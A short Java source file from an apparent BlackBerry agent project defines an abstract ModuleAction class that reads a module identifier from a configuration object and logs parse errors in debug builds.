//#preprocess
package blackberry.action;

import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

abstract class ModuleAction extends SubAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ModAction", DebugLevel.VERBOSE);
    //#endif
    protected String moduleId;

    /**
     * Instantiates a new stop agent action.
     * 
     * @param jsubaction
     *            the conf params
     */
    public ModuleAction(final ConfAction jsubaction) {
        super(jsubaction);
    }

    protected boolean parse(ConfAction params) {

        try {
            this.moduleId = params.getString("module");
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse");
            //#endif
            return false;
        }

        return true;
    }

}
